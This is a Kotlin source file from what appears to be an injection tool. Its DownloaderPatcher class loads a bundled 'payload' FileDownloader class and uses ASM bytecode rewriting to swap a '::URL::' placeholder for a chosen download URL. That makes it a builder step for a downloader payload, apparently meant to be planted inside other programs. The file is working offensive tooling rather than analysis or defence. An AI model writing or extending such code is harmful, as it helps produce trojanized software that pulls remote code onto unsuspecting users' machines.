package com.tmquan2508.inject.core.payload.transformation

import com.tmquan2508.inject.cli.Logs
import org.objectweb.asm.ClassReader
import org.objectweb.asm.ClassWriter
import org.objectweb.asm.tree.ClassNode
import org.objectweb.asm.tree.LdcInsnNode

class DownloaderPatcher {
    private companion object {
        const val DOWNLOADER_CLASS_NAME = "com/tmquan2508/payload/FileDownloader.class"
        const val DOWNLOADER_URL_PLACEHOLDER = "::URL::"
    }

    fun patchUrl(newUrl: String): ByteArray {
        val originalBytes = this.javaClass.classLoader.getResourceAsStream(DOWNLOADER_CLASS_NAME)?.readBytes()
            ?: throw IllegalStateException("Could not find internal downloader class: '$DOWNLOADER_CLASS_NAME'")

        val classReader = ClassReader(originalBytes)
        val classNode = ClassNode()
        classReader.accept(classNode, 0)
        var patched = false

        Logs.info(" -> Patching downloader with URL: '$newUrl'")

        for (method in classNode.methods) {
            for (insn in method.instructions) {
                if (insn is LdcInsnNode && insn.cst == DOWNLOADER_URL_PLACEHOLDER) {
                    insn.cst = newUrl
                    patched = true
                    Logs.debug("  [ASM-PATCH] Replaced downloader placeholder in ${classNode.name}")
                    break
                }
            }
            if (patched) break
        }

        if (!patched) {
            throw IllegalStateException("Could not find URL placeholder in downloader bytecode. Make sure it's compiled with '::URL::'.")
        }

        val classWriter = ClassWriter(ClassWriter.COMPUTE_FRAMES)
        classNode.accept(classWriter)
        return classWriter.toByteArray()
    }
}